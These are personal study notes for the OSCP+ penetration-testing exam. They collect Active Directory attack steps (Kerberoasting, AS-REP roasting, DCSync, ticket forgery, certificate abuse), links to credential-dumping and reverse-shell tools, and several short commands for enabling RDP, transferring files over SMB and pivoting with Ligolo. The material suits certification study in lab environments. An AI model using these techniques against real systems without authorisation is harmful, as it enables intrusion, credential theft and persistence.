# New Notes - OSCP+ (2024-11)

## Checklist

- [ ] `Ctrl + R` and search for "recent"
- [ ] Check recent access page to see what has been accessed
- [ ] 

## Study Resource

- Windows/AD HTB Academy
- HTB CTF
- PG Practice
- TJNull
- Lainkusanagi
- [Eater's OSCP Study Tracker](https://docs.google.com/spreadsheets/d/1nzEN0G6GzneWCfs6qte6Qqv-i8cV_j6po-tFlZAOx1k/edit?gid=488959887#gid=488959887)
- HTB Penetration Tester path

### What needs to learn on Windows?

- Many Potatoes
- Impacket tools for Kerberos (GetUserSPNs, GetNPUsers)
- Bloodhound more effectively
- NetExec's SMB capabilities

```
- For example, you can't use dot-slash notation (.\filename) when running msiexec from PowerShell, or it will just silently fail. (How was I supposed to know that!?)

- tree /f to rapidly display all the files, recursively, in folders in the given directory. It should be pretty easy to spot weird things

- tree /f /a C:\Users

- But go run that thing in app data. I dare you. Or looking for unatended xml files in C:\Windows. good luck

- Winpeas, even if you run it with the filesanalysis option

- If they teach SharpHound.ps1, learn bloodhound-python too.

- kerbrute and runas.exe, look up .ps1 scripts or alternatives.

- Know how to use tools like secretsdump on local SAM/SYSTEM files.

- HTB Tier 3  (Active Directory BloodHound, Using CrackMapExec, *Active Directory Trust Attacks*, Advanced SQL Injections, Active Directory PowerView, Active Directory LDAP)

- Make sure you can use BloodHound real well.

- S1ren and ippsec videos
```

## Tools:

- [LaZagne](https://github.com/AlessandroZ/LaZagne/tree/master) - retrieve lots of passwords stored on a local computer
- [Snaffler](https://github.com/SnaffCon/Snaffler) - find delicious candy needles (creds mostly, but it's flexible) in a bunch of horrible boring haystacks (a massive Windows/AD environment)
- [mimikittenz](https://github.com/orlyjamie/mimikittenz) - post-exploitation powershell tool in order to extract plain-text passwords from various target processes

## Methodologies

```
- https://mayfly277.github.io/assets/blog/pentest_ad_dark.svg

- https://www.reddit.com/r/oscp/comments/wcxrxb/active_directory_cheet_sheet/
```

### AD Methodology

```
These are some of the steps I use. I also used HTB Academy for learning, along with:

https://www.ired.team/

https://www.thehacker.recipes/ad/recon/

If your user does not have special rights from BloodHound:

AS-REP Roasting

Kerberoasting

Kerbrute

If step 1 gives you nothing:

Enumerate which users are interesting

Identify any interesting groups

Did you root the initial MS01 machine? If so:

Are there any Kerberoast tickets for users?

Are there LSA, LSASS, or SAM credentials you can reuse as another user?

SysVol:

There might be credentials in SysVol, such as:

GPP (Group Policy Preferences)

VBS scripts

Etc.

Enumerate LDAP:

There might be useful information in the descriptions of users and computers.

Is the domain controller vulnerable to any attacks, such as the Print Spooler service?

Is ADCS (Active Directory Certificate Services) in use? If so, consider abusing certificate templates.

Kerberos Attacks : Delegation ( 3 types), Silver ticket, Golden ticket

Reading LAPS and gMSA, DC sync...

Use multiple tools: Bloodhound, Powerview, netexec, ldapdump...

In general, my approach is: The DC has services like 88, 389, 445, etc., and I ask myself: Why is this there, and how can I abuse this service or gather additional information?

Also run bloodhound with data form sharphound and bloodhound python or revert machine, what I have discovered that sometimes you don't get all the data :)
```

```
Take Active Directory module on HTB academy its golden , In that module in enumeration section they will teach you bloodhound in depth , you will also learn do the same enumeration with PowerView they will teach you. You will become pro and then this is the resource which has almost all the custom built queries you can import it into your blood hound https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/ also this AD module is great for AD testing overall for oscp . Also do these AD boxes from this list https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/htmlview try to do all the HTB ad boxes and PG ad boxes . Get comfortable with Bloodhound , netexec if you want to conquer AD in oscp its just my opinion
```

```
There are likely 2 possibilities here:

Local Privilege Escalation on the starting machine (WS01).

Using the initial credentials to enumerate other domain machines and look for lateral movements (usually via creds)

If you do not find any obvious LPE, then you should probably look into other machines, particularly the DC.

A service on WS02 that is running on default/weak credentials?

A web page (on any machine) that is revealing potential usernames?

Kerberoasting / AS-REP roasting on the DC?

Kerbrute on DC for usernames?

etc.

A quick tip on OSCP: OffSec loves credential reuse - accounts sharing the same password, using username as password, etc. These are worth trying especially when you are stuck on priv esc. Sometimes it is about finding another way in.
```

```
Tiberius course: Windows privilege escalation
```

```
https://academy.hackthebox.com/path/preview/active-directory-penetration-tester
```

```
https://youtube.com/playlist?list=PLT08J44ErMmb9qaEeTYl5diQW6jWVHCR2&si=IgWyM3CLy9F6z4Kv - I watched this guy’s 3 OSCP Active Directory attack paths religiously the weeks before my exam. Definitely watch these and take notes. Follow along with his setup tutorial and set up the lab for yourself if you’re up to it. Incredible resource imo.

https://eins.li/posts/oscp-secret-sauce/ - I saw someone else recommend this resource here and wow, the small tips and tricks here go a long way. Particularly the busybox reverse shell being so consistent and the Mimikatz one liner are super useful and just small things that make life easier/save time.

https://github.com/crazywifi/Enable-RDP-One-Liner-CMD - Any time I needed to enable RDP on a box I had this up. Don’t forget you can use RDP. It makes life a lot easier/quicker when interacting with your target and can establish persistence. It’s not like it’s a real engagement so who cares, definitely use this if it makes your life easier.

https://www.revshells.com - Amazing site I wish I’d known about sooner honestly. Easily and quickly generate reverse shell one liners in just about any format imaginable. During my practice the most consistent for me on windows was the powershell base64 one and the busybox netcat for Linux.

```

```
https://www.youtube.com/playlist?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf
```


```
Read the OSCP Exam Guide and know how to take proper proof and local txt screenshots as well as how to submit the exam. https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide-Newly-Updated

Lain Kusanagi List (PG Machines Only) https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/

AD Mindmap https://orange-cyberdefense.github.io/ocd-mindmaps/

AutoRecon - The greatest enumeration tool and time saver. Learn to run it using a list of targets to save time. https://github.com/Tib3rius/AutoRecon

Rlwrap - Lets you use arrow keys in your reverse shell https://github.com/hanslub42/rlwrap

Revshells https://www.revshells.com

Enable RDP One-liner https://github.com/crazywifi/Enable-RDP-One-Liner-CMD

Ligolo - Know how to use this properly https://github.com/nicocha30/ligolo-ng

Bloodhound - Know how to use this properly and how to see all the domain objects. Sometimes the built in queries dont show everything so start with the groups and see all members and go from there

Sharphound 1.1.1 - Most compatible with the Kali version of Bloodhound https://github.com/BloodHoundAD/SharpHound/releases/tag/v1.1.1

Mimikatz https://github.com/ParrotSec/mimikatz

Rubeus https://github.com/GhostPack/Rubeus

LaZagne https://github.com/AlessandroZ/LaZagne

WinPeasAny https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md

Linpeas https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

PSPY - Checks for cron jobs with out root https://github.com/DominicBreuker/pspy

Godpotato https://github.com/BeichenDream/GodPotato

Tree Commands: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tree
```

```
You can also enable RDP with the netexec smb protocol.

netexec smb $IP -u username -p pass -M rdp -o ACTION=enable
```

```
Add a ligolo listener on 445. Then on kali start an Impacket smb server.

impacket-smbserver test . -smb2support -username example -password 123456

Then on MS02 mount that smb server but instead of using the Kali IP address use the MS01 ip addres

net use m: \MS01\test /user:example 123456

Then issue the command to copy to the smb share from MS02

copy example.pdf m:\
```

```
Congrats!

Question about Ligolo, If I have the tunneling up and running and my kali can reach the internal network, lets say I found a service which is running on the local port of the second machine (lets say MS2), how can I port forward it to my kali? Normally, Ligolo does it by adding the 240.0.0.1 route but then it will only forward the local port on the pivot machine (MS1) and not the MS2. Am I missing somthing or is this not possible with Ligolo?

Thanks,

Hello. I think the link below explains it pretty well. For example you want to add a listener in ligolo using this command:

listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4444

Then on kali if you send a request to MS1 on port 4444 it will get forwarded to MS2 on that port. You can also add a listener on for 80 to 80 as well so MS2 can reach your kali http server for example.

https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16
```
